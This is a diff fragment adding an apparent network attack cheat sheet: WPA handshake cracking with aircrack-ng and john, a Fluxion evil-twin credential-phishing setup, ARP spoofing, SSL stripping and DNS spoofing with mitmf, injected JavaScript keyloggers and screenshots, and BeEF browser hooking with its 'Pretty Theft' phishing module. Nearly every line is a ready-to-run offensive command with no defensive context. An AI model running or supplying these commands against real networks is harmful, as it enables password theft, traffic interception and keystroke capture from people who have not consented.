+airolib-ng  testdb --batch                      # Create list of PMK from wordlist
+aircrack-ng -r testdb <wpa_handshake_file>      # Crack the password using testdb
+
+# Saving aircrack cracking process
+john --wordlist=wpa-wordlist.txt --stdout --session=upc | aircrack-ng -w - -b 64:7C:34:A4:BB:B2 handshake-01.cap  # stores everything within the session called 'upc'
+john --restore=upc | aircrack-ng -w - -b 64:7C:34:A4:BB:B2 handshake-01.cap   # restore previous ran 'upc' session
+
+# Create web server and prompt user for WPA password (evil twin attack)
+git clone https://github.com/wi-fi-analyzer/fluxion.git
+cd fluxion/install
+./install.sh
+cd ../
+./fluxion.sh
+
+# Discover clients on the network
+netdiscover -r 192.168.1.1/24
+
+# ARP spoofing a client on the network using arpspoof or mitmf
+mitmf --arp --spoof --gateway 192.169.1.1 --target 192.168.1.20 -i wlan0
+
+# Bypass https/ssl with mitmf and sslstrip (doesn't work with HSTS)
+mitmf --arp --spoof --gateway 192.169.1.1 --target 192.168.1.20 -i wlan0
+if sslstrip is installed it should show 'SSLstrip online'
+
+# DNS spoofing while running fake website on apache2
+add your fake page to /var/www/
+service apache2 restart
+vi /etc/mitmf/mitmf.conf
+  [[[A]]]
+  *.mydomain.com=<insert_your_ip>
+mitmf --arp --spoof --gateway 192.169.1.1 --target 192.168.1.20 -i wlan0 --dns
+
+# using screenshot plugin and jskeylogger with mitmf
+mitmf --arp --spoof --gateway 192.169.1.1 --target 192.168.1.20 -i wlan0 --screen
+/var/logs/mitmf   # screenshots in this directory
+mitmf --arp --spoof --gateway 192.169.1.1 --target 192.168.1.20 -i wlan0 --jskeylogger
+
+# social engineering with beef, mitmf, and a browser javascript hook
+Run beef (in Kali linux). It will output a 'hook.js' url
+mitmf --arp --spoof --gateway 192.168.1.1 --targets <taget_ip> -i wlp2s0 --inject --js-url http://127.0.0.1:3000/hook.js
+Go back to beef. Should show target in 'Online Browsers'
+Commands Tab > Browser > Spyder Eye
+Commands Tab > Browser > Hooked Domain > Redirect Browser
+Commands Tab > Social Engineering > Pretty Theft
